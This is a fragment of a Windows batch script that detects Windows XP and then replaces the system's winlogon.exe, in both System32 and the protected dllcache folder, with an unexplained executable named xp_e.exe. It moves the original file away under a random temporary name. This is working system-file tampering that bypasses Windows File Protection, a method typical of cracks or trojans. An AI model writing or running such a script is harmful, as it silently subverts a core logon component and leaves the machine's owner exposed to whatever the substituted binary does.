...
echo.
echo Please wait...
REG QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v CurrentVersion | find /i "5.1" >nul 2>^&1 && goto _xp_e
goto _end

:_xp_e
if not exist %Windir%\Temp md %Windir%\Temp >nul
ren %Windir%\System32\dllcache\winlogon.exe winlogon.vvv
copy /y xp_e.exe %Windir%\System32\dllcache\winlogon.exe >nul
move %Windir%\System32\dllcache\winlogon.vvv %Windir%\Temp\%Random%.tmp >nul
ren %Windir%\System32\winlogon.exe winlogon.vvv
copy /y xp_e.exe %Windir%\System32\winlogon.exe >nul
